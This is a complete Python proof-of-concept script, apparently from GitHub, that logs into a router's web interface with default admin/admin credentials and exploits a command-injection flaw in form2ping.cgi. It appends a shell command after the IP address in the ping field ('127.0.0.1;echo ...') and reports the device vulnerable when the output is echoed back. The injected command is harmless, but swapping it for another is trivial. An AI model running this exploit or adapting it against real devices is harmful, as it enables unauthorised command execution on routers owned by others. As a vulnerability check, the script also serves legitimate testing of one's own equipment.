#!/usr/bin/env python3
import requests
import argparse
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def check_vulnerability(target, username, password):
    session = requests.Session()
    login_url = f"https://{target}/login.cgi"
    login_data = {"username": username, "password": password, "submit": "Login"}
    
    try:
        login_response = session.post(login_url, data=login_data, verify=False, timeout=10)
        if "logout.cgi" not in login_response.text:
            print("[!] Login failed. Check credentials.")
            return False
    except Exception as e:
        print(f"[!] Login error: {e}")
        return False

    exploit_url = f"https://{target}/form2ping.cgi"
    payload = "ip=127.0.0.1;echo 'Vulnerable'&submit=OK"
    
    try:
        response = session.post(exploit_url, data=payload, verify=False, timeout=10)
        if "Vulnerable" in response.text:
            print("[+] Router is vulnerable to CVE-2023-20048!")
            return True
        else:
            print("[-] Router is not vulnerable or patched.")
            return False
    except Exception as e:
        print(f"[!] Exploit check failed: {e}")
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2023-20048 PoC (GitHub @OguzhanOzuzun301)")
    parser.add_argument("-t", "--target", required=True, help="Target router IP")
    parser.add_argument("-u", "--username", default="admin", help="Admin username")
    parser.add_argument("-p", "--password", default="admin", help="Admin password")
    args = parser.parse_args()

    print(f"[*] Checking {args.target} for CVE-2023-20048...")
    check_vulnerability(args.target, args.username, args.password)
